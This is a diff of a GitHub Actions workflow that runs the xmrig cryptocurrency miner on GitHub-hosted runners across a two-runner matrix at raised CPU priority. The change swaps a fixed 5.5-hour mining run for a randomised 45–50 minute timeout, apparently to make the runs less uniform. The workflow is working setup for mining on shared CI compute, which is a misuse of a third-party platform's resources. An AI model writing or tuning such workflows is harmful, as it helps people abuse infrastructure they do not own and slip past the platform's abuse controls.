@@ -8,13 +8,16 @@ on:
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: ${{ fromJSON('[45, 46, 47, 48, 49, 50]')[github.run_number % 6] }}
     strategy:
       matrix:
         runner: [1, 2]
       fail-fast: false
 
     steps:
+      - name: Set Random Timeout
+        id: timeout
+        run: echo "minutes=$((45 + RANDOM % 6))" >> $GITHUB_OUTPUT
+
       - name: System Health Check
         run: |
           echo "=== CPU Information ==="
@@ -115,6 +118,9 @@ jobs:
         run: |
           cd xmrig/build
 
+          # Calculate timeout in seconds (random minutes * 60 - 60s buffer for cleanup)
+          TIMEOUT_SECONDS=$((${{ steps.timeout.outputs.minutes }} * 60 - 60))
+
           # Start resource monitoring in background
           (while true; do
             echo "=== $(date) ==="
@@ -124,8 +130,8 @@ jobs:
           done) > ../../mining_stats_${{ matrix.runner }}.log 2>&1 &
           MONITOR_PID=$!
 
-          # Run mining with optimized settings (19800s = 5.5 hours, leaving 30min for cleanup)
-          sudo nice -n -10 timeout 19800 ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr || true
+          # Run mining with random timeout between 45-50 minutes
+          sudo nice -n -10 timeout $TIMEOUT_SECONDS ./xmrig --config=config.json --randomx-mode=fast --randomx-no-rdmsr || true
 
           # Stop monitoring
           kill $MONITOR_PID 2>/dev/null || true
